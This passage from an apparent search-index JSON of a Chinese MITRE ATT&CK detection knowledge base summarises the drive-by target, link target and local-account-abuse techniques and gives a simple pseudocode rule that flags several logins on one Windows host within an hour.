\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4e0a\u4f20\u6216\u6ce8\u5165\u6076\u610f\u7684\u7f51\u7edc\u5185\u5bb9\uff0c\u5982JavaScript\u3002\u8fd9\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u5b9e\u73b0\uff0c\u5305\u62ec\u5c06\u6076\u610f\u811a\u672c\u63d2\u5165\u7f51\u9875\u6216\u5176\u4ed6\u7528\u6237\u53ef\u63a7\u5236\u7684\u7f51\u7edc\u5185\u5bb9\uff0c\u5982\u8bba\u575b\u5e16\u5b50\u3002\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u5236\u4f5c\u6076\u610f\u7684\u7f51\u7edc\u5e7f\u544a\uff0c\u5e76\u901a\u8fc7\u5408\u6cd5\u7684\u5e7f\u544a\u4f9b\u5e94\u5546\u8d2d\u4e70\u7f51\u7ad9\u4e0a\u7684\u5e7f\u544a\u7a7a\u95f4\u3002\u9664\u4e86\u653e\u7f6e\u5185\u5bb9\u4ee5\u5229\u7528\u7528\u6237\u7684\u7f51\u7edc\u6d4f\u89c8\u5668\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u653e\u7f6e\u811a\u672c\u5185\u5bb9\u6765\u63cf\u8ff0\u7528\u6237\u7684\u6d4f\u89c8\u5668\uff08\u5982\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f\uff09\uff0c\u4ee5\u786e\u4fdd\u5176\u5728\u5c1d\u8bd5\u5229\u7528\u524d\u662f\u8106\u5f31\u7684\u3002 \u88ab\u653b\u51fb\u8005\u653b\u7834\u5e76\u7528\u4e8e\u5b9e\u65bd\u5077\u6e21\u7684\u7f51\u7ad9\u53ef\u80fd\u662f\u7279\u5b9a\u7fa4\u4f53\u8bbf\u95ee\u7684\u7f51\u7ad9\uff0c\u5982\u653f\u5e9c\u3001\u7279\u5b9a\u884c\u4e1a\u6216\u5730\u533a\uff0c\u5176\u76ee\u7684\u662f\u57fa\u4e8e\u5171\u540c\u7684\u5174\u8da3\uff0c\u653b\u7834\u7279\u5b9a\u7528\u6237\u6216\u4e00\u7ec4\u7528\u6237\u3002\u8fd9\u79cd\u6709\u9488\u5bf9\u6027\u7684\u653b\u51fb\u88ab\u79f0\u4e3a\u6218\u7565\u7f51\u7edc\u653b\u51fb\u6216\u6c34\u5751\u653b\u51fb\u3002 \u653b\u51fb\u8005\u5728\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\uff08\u57df\u540d\uff09\u7684\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u80fd\u4f1a\u8d2d\u4e70\u4e0e\u5408\u6cd5\u57df\u540d\u7c7b\u4f3c\u7684\u57df\u540d\uff08\u4f8b\u5982\uff1a\u540c\u97f3\u5b57\u3001\u9519\u522b\u5b57\u3001\u4e0d\u540c\u7684\u9876\u7ea7\u57df\u540d\u7b49\uff09\uff0c\u4ee5\u5e2e\u52a9\u4fc3\u8fdb\u5077\u6e21\u5f0f\u7834\u574f\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/#_1","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/#_8","text":"\u8fd9\u79cd\u6d3b\u52a8\u7684\u5927\u90e8\u5206\u5c06\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u53ef\u89c1\u6027\u4e4b\u5916\uff0c\u56e0\u6b64\u5f88\u96be\u68c0\u6d4b\u5230\u8fd9\u79cd\u884c\u4e3a\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u5176\u4ed6\u9636\u6bb5\uff0c\u4f8b\u5982\u901a\u8fc7\u59a5\u534f\u6216\u5229\u7528\u5ba2\u6237\u7aef\u6267\u884c\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/#_9","text":"MITRE-ATT&CK-T1608-004 https://attack.mitre.org/techniques/T1608/004/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/","text":"T1608-005-\u9636\u6bb5\u6027\u80fd\u529b-Link Target \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u94fe\u63a5\u6240\u5f15\u7528\u7684\u8d44\u6e90\u653e\u5728\u9002\u5f53\u7684\u4f4d\u7f6e\uff0c\u4ee5\u4fbf\u5728\u9488\u5bf9\u7279\u5b9a\u76ee\u6807\u65f6\u4f7f\u7528\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f9d\u9760\u7528\u6237\u70b9\u51fb\u4e00\u4e2a\u6076\u610f\u94fe\u63a5\u6765\u6cc4\u9732\u4fe1\u606f\uff08\u5305\u62ec\u8bc1\u4e66\uff09\u6216\u83b7\u5f97\u6267\u884c\uff0c\u5982\u6076\u610f\u94fe\u63a5\u3002\u94fe\u63a5\u53ef\u7528\u4e8e\u9c7c\u53c9\u5f0f\u7f51\u7edc\u9493\u9c7c\uff0c\u5982\u53d1\u9001\u4e00\u5c01\u7535\u5b50\u90ae\u4ef6\uff0c\u5e76\u4f34\u6709\u793e\u4f1a\u5de5\u7a0b\u6587\u672c\uff0c\u4ee5\u54c4\u9a97\u7528\u6237\u4e3b\u52a8\u70b9\u51fb\u6216\u5728\u6d4f\u89c8\u5668\u4e2d\u590d\u5236\u548c\u7c98\u8d34\u4e00\u4e2aURL\u3002\u5728\u7f51\u7edc\u9493\u9c7c\u83b7\u53d6\u4fe1\u606f\uff08\u5982\u9c7c\u53c9\u5f0f\u94fe\u63a5\uff09\u6216\u7f51\u7edc\u9493\u9c7c\u83b7\u5f97\u5bf9\u7cfb\u7edf\u7684\u521d\u59cb\u8bbf\u95ee\uff08\u5982\u9c7c\u53c9\u5f0f\u94fe\u63a5\uff09\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u4e3a\u9c7c\u53c9\u5f0f\u94fe\u63a5\u7684\u94fe\u63a5\u76ee\u6807\u8bbe\u7f6e\u8d44\u6e90\u3002 \u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u94fe\u63a5\u76ee\u6807\u7684\u8d44\u6e90\u5c06\u662f\u4e00\u4e2aHTML\u9875\u9762\uff0c\u53ef\u80fd\u5305\u62ec\u4e00\u4e9b\u5ba2\u6237\u7aef\u811a\u672c\uff0c\u5982JavaScript\uff0c\u4ee5\u53ca\u51b3\u5b9a\u5411\u7528\u6237\u63d0\u4f9b\u4ec0\u4e48\u5185\u5bb9\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u514b\u9686\u5408\u6cd5\u7f51\u7ad9\u4f5c\u4e3a\u94fe\u63a5\u76ee\u6807\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u514b\u9686\u5408\u6cd5\u7f51\u7edc\u670d\u52a1\u7684\u767b\u5f55\u9875\u9762\u6216\u7ec4\u7ec7\u7684\u767b\u5f55\u9875\u9762\uff0c\u5728\u9c7c\u53c9\u5f0f\u7f51\u7edc\u9493\u9c7c\u94fe\u63a5\u671f\u95f4\u83b7\u53d6\u51ed\u636e\u3002 \u5728\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\uff08\u57df\u540d\uff09\u671f\u95f4\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u4e0e\u5408\u6cd5\u57df\u540d\u76f8\u4f3c\u7684\u57df\u540d\uff08\u4f8b\u5982\uff1a\u540c\u97f3\u5b57\u3001\u9519\u522b\u5b57\u3001\u4e0d\u540c\u7684\u9876\u7ea7\u57df\u540d\u7b49\uff09\uff0c\u4ee5\u5e2e\u52a9\u4fc3\u8fdb\u6076\u610f\u94fe\u63a5\u3002\u4e5f\u53ef\u4ee5\u4f7f\u7528\u77ed\u57df\u540d\u670d\u52a1\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8fd9\u79cd\u6d3b\u52a8\u7684\u5927\u90e8\u5206\u5c06\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u53ef\u89c1\u6027\u4e4b\u5916\uff0c\u56e0\u6b64\u5f88\u96be\u68c0\u6d4b\u5230\u8fd9\u79cd\u884c\u4e3a\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u5176\u4ed6\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u7f51\u7edc\u9493\u9c7c\u94fe\u63a5\u6216\u6076\u610f\u94fe\u63a5\u671f\u95f4\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1608-005 https://attack.mitre.org/techniques/T1608/005/","title":"T1608-005-\u9636\u6bb5\u6027\u80fd\u529b-Link Target"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/#t1608-005-link-target","text":"","title":"T1608-005-\u9636\u6bb5\u6027\u80fd\u529b-Link Target"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u94fe\u63a5\u6240\u5f15\u7528\u7684\u8d44\u6e90\u653e\u5728\u9002\u5f53\u7684\u4f4d\u7f6e\uff0c\u4ee5\u4fbf\u5728\u9488\u5bf9\u7279\u5b9a\u76ee\u6807\u65f6\u4f7f\u7528\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f9d\u9760\u7528\u6237\u70b9\u51fb\u4e00\u4e2a\u6076\u610f\u94fe\u63a5\u6765\u6cc4\u9732\u4fe1\u606f\uff08\u5305\u62ec\u8bc1\u4e66\uff09\u6216\u83b7\u5f97\u6267\u884c\uff0c\u5982\u6076\u610f\u94fe\u63a5\u3002\u94fe\u63a5\u53ef\u7528\u4e8e\u9c7c\u53c9\u5f0f\u7f51\u7edc\u9493\u9c7c\uff0c\u5982\u53d1\u9001\u4e00\u5c01\u7535\u5b50\u90ae\u4ef6\uff0c\u5e76\u4f34\u6709\u793e\u4f1a\u5de5\u7a0b\u6587\u672c\uff0c\u4ee5\u54c4\u9a97\u7528\u6237\u4e3b\u52a8\u70b9\u51fb\u6216\u5728\u6d4f\u89c8\u5668\u4e2d\u590d\u5236\u548c\u7c98\u8d34\u4e00\u4e2aURL\u3002\u5728\u7f51\u7edc\u9493\u9c7c\u83b7\u53d6\u4fe1\u606f\uff08\u5982\u9c7c\u53c9\u5f0f\u94fe\u63a5\uff09\u6216\u7f51\u7edc\u9493\u9c7c\u83b7\u5f97\u5bf9\u7cfb\u7edf\u7684\u521d\u59cb\u8bbf\u95ee\uff08\u5982\u9c7c\u53c9\u5f0f\u94fe\u63a5\uff09\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u4e3a\u9c7c\u53c9\u5f0f\u94fe\u63a5\u7684\u94fe\u63a5\u76ee\u6807\u8bbe\u7f6e\u8d44\u6e90\u3002 \u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u94fe\u63a5\u76ee\u6807\u7684\u8d44\u6e90\u5c06\u662f\u4e00\u4e2aHTML\u9875\u9762\uff0c\u53ef\u80fd\u5305\u62ec\u4e00\u4e9b\u5ba2\u6237\u7aef\u811a\u672c\uff0c\u5982JavaScript\uff0c\u4ee5\u53ca\u51b3\u5b9a\u5411\u7528\u6237\u63d0\u4f9b\u4ec0\u4e48\u5185\u5bb9\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u514b\u9686\u5408\u6cd5\u7f51\u7ad9\u4f5c\u4e3a\u94fe\u63a5\u76ee\u6807\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u514b\u9686\u5408\u6cd5\u7f51\u7edc\u670d\u52a1\u7684\u767b\u5f55\u9875\u9762\u6216\u7ec4\u7ec7\u7684\u767b\u5f55\u9875\u9762\uff0c\u5728\u9c7c\u53c9\u5f0f\u7f51\u7edc\u9493\u9c7c\u94fe\u63a5\u671f\u95f4\u83b7\u53d6\u51ed\u636e\u3002 \u5728\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\uff08\u57df\u540d\uff09\u671f\u95f4\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u4e0e\u5408\u6cd5\u57df\u540d\u76f8\u4f3c\u7684\u57df\u540d\uff08\u4f8b\u5982\uff1a\u540c\u97f3\u5b57\u3001\u9519\u522b\u5b57\u3001\u4e0d\u540c\u7684\u9876\u7ea7\u57df\u540d\u7b49\uff09\uff0c\u4ee5\u5e2e\u52a9\u4fc3\u8fdb\u6076\u610f\u94fe\u63a5\u3002\u4e5f\u53ef\u4ee5\u4f7f\u7528\u77ed\u57df\u540d\u670d\u52a1\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/#_1","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/#_8","text":"\u8fd9\u79cd\u6d3b\u52a8\u7684\u5927\u90e8\u5206\u5c06\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u53ef\u89c1\u6027\u4e4b\u5916\uff0c\u56e0\u6b64\u5f88\u96be\u68c0\u6d4b\u5230\u8fd9\u79cd\u884c\u4e3a\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u5176\u4ed6\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u7f51\u7edc\u9493\u9c7c\u94fe\u63a5\u6216\u6076\u610f\u94fe\u63a5\u671f\u95f4\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/#_9","text":"MITRE-ATT&CK-T1608-005 https://attack.mitre.org/techniques/T1608/005/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/","text":"T1078-003-windows-\u591a\u8d26\u6237\u540c\u65f6\u767b\u9646 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u83b7\u53d6\u5e76\u6ee5\u7528\u672c\u5730\u5e10\u6237\u7684\u51ed\u636e\uff0c\u4ee5\u83b7\u53d6\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff0c\u6301\u4e45\u6027\uff0c\u6743\u9650\u63d0\u5347\u6216\u9632\u5fa1\u9003\u907f\u3002\u672c\u5730\u5e10\u6237\u662f\u7531\u7ec4\u7ec7\u914d\u7f6e\u7684\u5e10\u6237\uff0c\u4f9b\u7528\u6237\uff0c\u8fdc\u7a0b\u652f\u6301\uff0c\u670d\u52a1\u4f7f\u7528\u6216\u5728\u5355\u4e2a\u7cfb\u7edf\u6216\u670d\u52a1\u4e0a\u8fdb\u884c\u7ba1\u7406\u3002 \u901a\u8fc7OS\u51ed\u636e\u8f6c\u50a8\uff0c\u672c\u5730\u5e10\u6237\u4e5f\u53ef\u80fd\u88ab\u6ee5\u7528\u4ee5\u63d0\u5347\u7279\u6743\u548c\u6536\u96c6\u51ed\u636e\u3002\u4e3a\u4e86\u7279\u6743\u5347\u7ea7\u548c\u6a2a\u5411\u79fb\u52a8\uff0c\u5bc6\u7801\u91cd\u7528\u53ef\u80fd\u5141\u8bb8\u6ee5\u7528\u7f51\u7edc\u4e0a\u7684\u4e00\u7ec4\u8ba1\u7b97\u673a\u4e0a\u7684\u672c\u5730\u5e10\u6237\u3002 \u6d4b\u8bd5\u6848\u4f8b \u591a\u4e2a\u7528\u6237\u540c\u65f6\u6216\u8005\u5728\u540c\u4e00\u5c0f\u65f6\u5185\u767b\u5f55\u5230\u540c\u4e00\u53f0\u8ba1\u7b97\u673a\u4e0a\uff0c\u901a\u5e38\u4e0d\u4f1a\u51fa\u73b0\u5728\u6211\u4eec\u89c2\u5bdf\u5230\u7684\u7f51\u7edc\u4e2d\u3002 \u767b\u5f55\u4e8b\u4ef6\u662f\u9002\u7528\u4e8eWindows Vista\u53ca\u66f4\u9ad8\u7248\u672c\u7684Windows\uff0c\u9002\u7528\u4e8eVista\u4e4b\u540e\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a4624\u3002\u9002\u7528\u4e8eVista\u4e4b\u524d\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a528/540\u3002Windows Vista\u53ca\u66f4\u9ad8\u7248\u672c\u7684\u6ce8\u9500\u4e8b\u4ef6ID\u4e3a4634\uff0cVista\u4e4b\u524d\u7684\u6ce8\u9500\u4e8b\u4ef6ID\u4e3a538\u3002\u767b\u5f55\u7c7b\u578b2,3,9\u548c10\u662f\u503c\u5f97\u5173\u6ce8\u7684\u3002\u6709\u5173\u66f4\u591a\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605Microsoft\u7684\u201c \u5ba1\u6838\u767b\u5f55\u4e8b\u4ef6\u201d \u9875\u9762\u4e0a\u7684\u201c\u767b\u5f55\u7c7b\u578b\u201d\u8868\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 \u5173\u6ce8windows\u767b\u9646\u4e8b\u4ef6\uff0c\u5e76\u7559\u610f\u767b\u9646\u7c7b\u578b\u3002\u9002\u7528\u4e8eVista\u4e4b\u540e\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a4624\uff1b\u9002\u7528\u4e8eVista\u4e4b\u524d\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a528/540\uff1b\u767b\u5f55\u7c7b\u578b2,3,9\u548c10\u662f\u503c\u5f97\u5173\u6ce8\u7684\u3002 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def es\u89c4\u5219 \u601d\u8def\uff1a\u7edf\u8ba1\u5728\u4e00\u5c0f\u65f6\u5185\uff0c\u540c\u4e00\u53f0\u4e3b\u673a\u4e0a\uff0c\u767b\u9646\u7684\u7528\u6237\u662f\u5426\u5927\u4e8e\u4e00\u4e2a users_list = search UserSession:Login users_grouped = group users_list by hostname users_grouped = from users_grouped select min(time) as earliest_time, max(time) as latest_time count(user) as user_count multiple_logins = filter users_grouped where (latest_time - earliest_time <= 1 hour and user_count > 1) output multiple_logins \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1078-003 https://attack.mitre.org/techniques/T1078/003/","title":"T1078-003-windows-\u591a\u8d26\u6237\u540c\u65f6\u767b\u9646"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#t1078-003-windows-","text":"","title":"T1078-003-windows-\u591a\u8d26\u6237\u540c\u65f6\u767b\u9646"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u83b7\u53d6\u5e76\u6ee5\u7528\u672c\u5730\u5e10\u6237\u7684\u51ed\u636e\uff0c\u4ee5\u83b7\u53d6\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff0c\u6301\u4e45\u6027\uff0c\u6743\u9650\u63d0\u5347\u6216\u9632\u5fa1\u9003\u907f\u3002\u672c\u5730\u5e10\u6237\u662f\u7531\u7ec4\u7ec7\u914d\u7f6e\u7684\u5e10\u6237\uff0c\u4f9b\u7528\u6237\uff0c\u8fdc\u7a0b\u652f\u6301\uff0c\u670d\u52a1\u4f7f\u7528\u6216\u5728\u5355\u4e2a\u7cfb\u7edf\u6216\u670d\u52a1\u4e0a\u8fdb\u884c\u7ba1\u7406\u3002 \u901a\u8fc7OS\u51ed\u636e\u8f6c\u50a8\uff0c\u672c\u5730\u5e10\u6237\u4e5f\u53ef\u80fd\u88ab\u6ee5\u7528\u4ee5\u63d0\u5347\u7279\u6743\u548c\u6536\u96c6\u51ed\u636e\u3002\u4e3a\u4e86\u7279\u6743\u5347\u7ea7\u548c\u6a2a\u5411\u79fb\u52a8\uff0c\u5bc6\u7801\u91cd\u7528\u53ef\u80fd\u5141\u8bb8\u6ee5\u7528\u7f51\u7edc\u4e0a\u7684\u4e00\u7ec4\u8ba1\u7b97\u673a\u4e0a\u7684\u672c\u5730\u5e10\u6237\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_1","text":"\u591a\u4e2a\u7528\u6237\u540c\u65f6\u6216\u8005\u5728\u540c\u4e00\u5c0f\u65f6\u5185\u767b\u5f55\u5230\u540c\u4e00\u53f0\u8ba1\u7b97\u673a\u4e0a\uff0c\u901a\u5e38\u4e0d\u4f1a\u51fa\u73b0\u5728\u6211\u4eec\u89c2\u5bdf\u5230\u7684\u7f51\u7edc\u4e2d\u3002 \u767b\u5f55\u4e8b\u4ef6\u662f\u9002\u7528\u4e8eWindows Vista\u53ca\u66f4\u9ad8\u7248\u672c\u7684Windows\uff0c\u9002\u7528\u4e8eVista\u4e4b\u540e\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a4624\u3002\u9002\u7528\u4e8eVista\u4e4b\u524d\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a528/540\u3002Windows Vista\u53ca\u66f4\u9ad8\u7248\u672c\u7684\u6ce8\u9500\u4e8b\u4ef6ID\u4e3a4634\uff0cVista\u4e4b\u524d\u7684\u6ce8\u9500\u4e8b\u4ef6ID\u4e3a538\u3002\u767b\u5f55\u7c7b\u578b2,3,9\u548c10\u662f\u503c\u5f97\u5173\u6ce8\u7684\u3002\u6709\u5173\u66f4\u591a\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605Microsoft\u7684\u201c \u5ba1\u6838\u767b\u5f55\u4e8b\u4ef6\u201d \u9875\u9762\u4e0a\u7684\u201c\u767b\u5f55\u7c7b\u578b\u201d\u8868\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_2","text":"windows 